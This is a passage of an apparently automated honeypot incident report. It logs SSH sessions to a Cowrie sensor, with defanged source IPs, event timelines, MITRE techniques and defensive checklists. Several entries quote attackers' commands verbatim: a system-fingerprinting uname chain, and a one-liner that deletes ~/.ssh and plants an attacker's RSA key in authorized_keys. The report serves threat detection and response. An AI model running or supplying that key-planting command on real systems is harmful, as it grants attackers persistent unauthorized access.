| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:48:43` | `cowrie.session.connect` |
| `2026-08-23 19:48:43` | `cowrie.client.version` |
| `2026-08-23 19:48:43` | `cowrie.client.kex` |
| `2026-08-23 19:48:45` | `cowrie.login.success` |
| `2026-08-23 19:48:46` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:48:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.78.177[.]237` to AbuseIPDB if not already reported
- [ ] Block `112.78.177[.]237` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a569ba9cc1a

| Field | Detail |
|---|---|
| **Source IP** | `101.13.3[.]207` |
| **First Seen** | 2026-08-23 19:48 |
| **Last Seen** | 2026-08-23 19:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:48:50` | `cowrie.session.connect` |
| `2026-08-23 19:48:51` | `cowrie.client.version` |
| `2026-08-23 19:48:51` | `cowrie.client.kex` |
| `2026-08-23 19:48:53` | `cowrie.login.success` |
| `2026-08-23 19:48:54` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:48:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.3[.]207` to AbuseIPDB if not already reported
- [ ] Block `101.13.3[.]207` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2102383d293

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:49 |
| **Last Seen** | 2026-08-23 19:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:49:02` | `cowrie.session.connect` |
| `2026-08-23 19:49:02` | `cowrie.client.version` |
| `2026-08-23 19:49:02` | `cowrie.client.kex` |
| `2026-08-23 19:49:03` | `cowrie.login.success` |
| `2026-08-23 19:49:04` | `cowrie.session.params` |
| `2026-08-23 19:49:04` | `cowrie.command.input` |
| `2026-08-23 19:49:04` | `cowrie.command.input` |
| `2026-08-23 19:49:04` | `cowrie.command.input` |
| `2026-08-23 19:49:04` | `cowrie.command.input` |
| `2026-08-23 19:49:04` | `cowrie.command.input` |
| `2026-08-23 19:49:04` | `cowrie.command.success` |
| `2026-08-23 19:49:04` | `cowrie.command.input` |
| `2026-08-23 19:49:04` | `cowrie.command.input` |
| `2026-08-23 19:49:04` | `cowrie.command.input` |
| `2026-08-23 19:49:04` | `cowrie.command.input` |
| `2026-08-23 19:49:04` | `cowrie.log.closed` |
| `2026-08-23 19:49:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d63aae4e0e5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:50 |
| **Last Seen** | 2026-08-23 19:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:50:59` | `cowrie.session.connect` |
| `2026-08-23 19:50:59` | `cowrie.client.version` |
| `2026-08-23 19:50:59` | `cowrie.client.kex` |
| `2026-08-23 19:51:00` | `cowrie.login.success` |
| `2026-08-23 19:51:01` | `cowrie.session.params` |
| `2026-08-23 19:51:01` | `cowrie.command.input` |
| `2026-08-23 19:51:01` | `cowrie.command.input` |
| `2026-08-23 19:51:01` | `cowrie.command.input` |
| `2026-08-23 19:51:01` | `cowrie.command.input` |
| `2026-08-23 19:51:01` | `cowrie.command.input` |
| `2026-08-23 19:51:01` | `cowrie.command.success` |
| `2026-08-23 19:51:01` | `cowrie.command.input` |
| `2026-08-23 19:51:01` | `cowrie.command.input` |
| `2026-08-23 19:51:01` | `cowrie.command.input` |
| `2026-08-23 19:51:01` | `cowrie.command.input` |
| `2026-08-23 19:51:01` | `cowrie.log.closed` |
| `2026-08-23 19:51:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-386dbcc439b0

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-23 19:51 |
| **Last Seen** | 2026-08-23 19:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:51:36` | `cowrie.session.connect` |
| `2026-08-23 19:51:36` | `cowrie.client.version` |
| `2026-08-23 19:51:36` | `cowrie.client.kex` |
| `2026-08-23 19:51:36` | `cowrie.login.success` |
| `2026-08-23 19:51:36` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:51:36` | `cowrie.direct-tcpip.data` |
| `2026-08-23 19:51:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2de40a77e97e

| Field | Detail |
|---|---|
| **Source IP** | `153.37.177[.]219` |
| **First Seen** | 2026-08-23 19:52 |
| **Last Seen** | 2026-08-23 19:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:52:25` | `cowrie.session.connect` |
| `2026-08-23 19:52:26` | `cowrie.client.version` |
| `2026-08-23 19:52:26` | `cowrie.client.kex` |
| `2026-08-23 19:52:28` | `cowrie.login.success` |
| `2026-08-23 19:52:28` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:52:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.37.177[.]219` to AbuseIPDB if not already reported
- [ ] Block `153.37.177[.]219` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a045dc961a8a

| Field | Detail |
|---|---|
| **Source IP** | `182.71.135[.]110` |
| **First Seen** | 2026-08-23 19:52 |
| **Last Seen** | 2026-08-23 19:52 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:52:30` | `cowrie.session.connect` |
| `2026-08-23 19:52:30` | `cowrie.client.version` |
| `2026-08-23 19:52:31` | `cowrie.client.kex` |
| `2026-08-23 19:52:32` | `cowrie.login.success` |
| `2026-08-23 19:52:33` | `cowrie.session.params` |
| `2026-08-23 19:52:33` | `cowrie.command.input` |
| `2026-08-23 19:52:33` | `cowrie.command.failed` |
| `2026-08-23 19:52:34` | `cowrie.log.closed` |
| `2026-08-23 19:52:35` | `cowrie.session.params` |
| `2026-08-23 19:52:35` | `cowrie.command.input` |
| `2026-08-23 19:52:35` | `cowrie.session.file_download` |
| `2026-08-23 19:52:35` | `cowrie.log.closed` |
| `2026-08-23 19:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.71.135[.]110` to AbuseIPDB if not already reported
- [ ] Block `182.71.135[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-065ccad4d05d

| Field | Detail |
|---|---|
| **Source IP** | `222.76.248[.]54` |
| **First Seen** | 2026-08-23 19:52 |
| **Last Seen** | 2026-08-23 19:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:52:34` | `cowrie.session.connect` |
| `2026-08-23 19:52:35` | `cowrie.client.version` |
| `2026-08-23 19:52:35` | `cowrie.client.kex` |
| `2026-08-23 19:52:38` | `cowrie.login.success` |
| `2026-08-23 19:52:39` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:52:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.76.248[.]54` to AbuseIPDB if not already reported
- [ ] Block `222.76.248[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea69dcdb8ec0

| Field | Detail |
|---|---|
| **Source IP** | `138.124.158[.]150` |
| **First Seen** | 2026-08-23 19:52 |
| **Last Seen** | 2026-08-23 19:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:52:35` | `cowrie.session.connect` |
| `2026-08-23 19:52:35` | `cowrie.client.version` |
| `2026-08-23 19:52:35` | `cowrie.client.kex` |
| `2026-08-23 19:52:36` | `cowrie.login.success` |
| `2026-08-23 19:52:37` | `cowrie.session.params` |
| `2026-08-23 19:52:37` | `cowrie.command.input` |
| `2026-08-23 19:52:37` | `cowrie.command.failed` |
| `2026-08-23 19:52:37` | `cowrie.log.closed` |
| `2026-08-23 19:52:38` | `cowrie.session.params` |
| `2026-08-23 19:52:38` | `cowrie.command.input` |
| `2026-08-23 19:52:38` | `cowrie.session.file_download` |
| `2026-08-23 19:52:38` | `cowrie.log.closed` |
| `2026-08-23 19:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.158[.]150` to AbuseIPDB if not already reported
- [ ] Block `138.124.158[.]150` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e114b67f2af

| Field | Detail |
|---|---|
| **Source IP** | `182.71.135[.]110` |
| **First Seen** | 2026-08-23 19:52 |
| **Last Seen** | 2026-08-23 19:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:52:36` | `cowrie.session.connect` |
| `2026-08-23 19:52:36` | `cowrie.client.version` |
| `2026-08-23 19:52:36` | `cowrie.client.kex` |
| `2026-08-23 19:52:38` | `cowrie.login.success` |
| `2026-08-23 19:52:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.71.135[.]110` to AbuseIPDB if not already reported
- [ ] Block `182.71.135[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24019b7cce93

| Field | Detail |
|---|---|
| **Source IP** | `138.124.158[.]150` |
| **First Seen** | 2026-08-23 19:52 |
| **Last Seen** | 2026-08-23 19:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:52:38` | `cowrie.session.connect` |
| `2026-08-23 19:52:38` | `cowrie.client.version` |
| `2026-08-23 19:52:38` | `cowrie.client.kex` |
| `2026-08-23 19:52:39` | `cowrie.login.success` |
| `2026-08-23 19:52:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.158[.]150` to AbuseIPDB if not already reported
- [ ] Block `138.124.158[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be5fe9c5e7bb

| Field | Detail |
|---|---|
| **Source IP** | `182.71.135[.]110` |
| **First Seen** | 2026-08-23 19:52 |
| **Last Seen** | 2026-08-23 19:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:52:39` | `cowrie.session.connect` |
| `2026-08-23 19:52:39` | `cowrie.client.version` |
| `2026-08-23 19:52:39` | `cowrie.client.kex` |
| `2026-08-23 19:52:41` | `cowrie.login.success` |
| `2026-08-23 19:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.71.135[.]110` to AbuseIPDB if not already reported
- [ ] Block `182.71.135[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07d47dd6cda6

| Field | Detail |
|---|---|
| **Source IP** | `138.124.158[.]150` |
| **First Seen** | 2026-08-23 19:52 |
| **Last Seen** | 2026-08-23 19:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:52:39` | `cowrie.session.connect` |
| `2026-08-23 19:52:39` | `cowrie.client.version` |
| `2026-08-23 19:52:40` | `cowrie.client.kex` |
| `2026-08-23 19:52:40` | `cowrie.login.success` |
| `2026-08-23 19:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.124.158[.]150` to AbuseIPDB if not already reported
- [ ] Block `138.124.158[.]150` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de43ef929ca7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:52 |
| **Last Seen** | 2026-08-23 19:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:52:53` | `cowrie.session.connect` |
| `2026-08-23 19:52:53` | `cowrie.client.version` |
| `2026-08-23 19:52:53` | `cowrie.client.kex` |
| `2026-08-23 19:52:53` | `cowrie.login.success` |
| `2026-08-23 19:52:54` | `cowrie.session.params` |
| `2026-08-23 19:52:54` | `cowrie.command.input` |
| `2026-08-23 19:52:54` | `cowrie.command.input` |
| `2026-08-23 19:52:54` | `cowrie.command.input` |
| `2026-08-23 19:52:54` | `cowrie.command.input` |
| `2026-08-23 19:52:54` | `cowrie.command.input` |
| `2026-08-23 19:52:54` | `cowrie.command.success` |
| `2026-08-23 19:52:54` | `cowrie.command.input` |
| `2026-08-23 19:52:54` | `cowrie.command.input` |
| `2026-08-23 19:52:54` | `cowrie.command.input` |
| `2026-08-23 19:52:54` | `cowrie.command.input` |
| `2026-08-23 19:52:55` | `cowrie.log.closed` |
| `2026-08-23 19:52:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-598275b1ef82

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:54 |
| **Last Seen** | 2026-08-23 19:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:54:40` | `cowrie.session.connect` |
| `2026-08-23 19:54:40` | `cowrie.client.version` |
| `2026-08-23 19:54:40` | `cowrie.client.kex` |
| `2026-08-23 19:54:41` | `cowrie.login.success` |
| `2026-08-23 19:54:42` | `cowrie.session.params` |
| `2026-08-23 19:54:42` | `cowrie.command.input` |
| `2026-08-23 19:54:42` | `cowrie.command.input` |
| `2026-08-23 19:54:42` | `cowrie.command.input` |
| `2026-08-23 19:54:42` | `cowrie.command.input` |
| `2026-08-23 19:54:42` | `cowrie.command.input` |
| `2026-08-23 19:54:42` | `cowrie.command.success` |
| `2026-08-23 19:54:42` | `cowrie.command.input` |
| `2026-08-23 19:54:42` | `cowrie.command.input` |
| `2026-08-23 19:54:42` | `cowrie.command.input` |
| `2026-08-23 19:54:42` | `cowrie.command.input` |
| `2026-08-23 19:54:43` | `cowrie.log.closed` |
| `2026-08-23 19:54:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-248024153f3c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:56 |
| **Last Seen** | 2026-08-23 19:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:56:25` | `cowrie.session.connect` |
| `2026-08-23 19:56:25` | `cowrie.client.version` |
| `2026-08-23 19:56:25` | `cowrie.client.kex` |
| `2026-08-23 19:56:26` | `cowrie.login.success` |
| `2026-08-23 19:56:27` | `cowrie.session.params` |
| `2026-08-23 19:56:27` | `cowrie.command.input` |
| `2026-08-23 19:56:27` | `cowrie.command.input` |
| `2026-08-23 19:56:27` | `cowrie.command.input` |
| `2026-08-23 19:56:27` | `cowrie.command.input` |
| `2026-08-23 19:56:27` | `cowrie.command.input` |
| `2026-08-23 19:56:27` | `cowrie.command.success` |
| `2026-08-23 19:56:27` | `cowrie.command.input` |
| `2026-08-23 19:56:27` | `cowrie.command.input` |
| `2026-08-23 19:56:27` | `cowrie.command.input` |
| `2026-08-23 19:56:27` | `cowrie.command.input` |
| `2026-08-23 19:56:27` | `cowrie.log.closed` |
| `2026-08-23 19:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1336178779b4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 19:57 |
| **Last Seen** | 2026-08-23 19:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:57:54` | `cowrie.session.connect` |
| `2026-08-23 19:57:54` | `cowrie.client.version` |
| `2026-08-23 19:57:54` | `cowrie.client.kex` |
| `2026-08-23 19:57:55` | `cowrie.login.success` |
| `2026-08-23 19:57:56` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:57:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 19:57:56` | `cowrie.direct-tcpip.data` |
| `2026-08-23 19:57:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbc23164b0b5

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 19:57 |
| **Last Seen** | 2026-08-23 19:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 19:57:57` | `cowrie.session.connect` |
| `2026-08-23 19:57:58` | `cowrie.client.version` |
| `2026-08-23 19:57:58` | `cowrie.client.kex` |
| `2026-08-23 19:57:59` | `cowrie.login.success` |
| `2026-08-23 19:57:59` | `cowrie.direct-tcpip.request` |
| `2026-08-23 19:57:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 19:57:59` | `cowrie.direct-tcpip.data` |
| `2026-08-23 19:57:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e008d779dbd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-23 19:58 |
| **Last Seen** | 2026-08-23 19:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
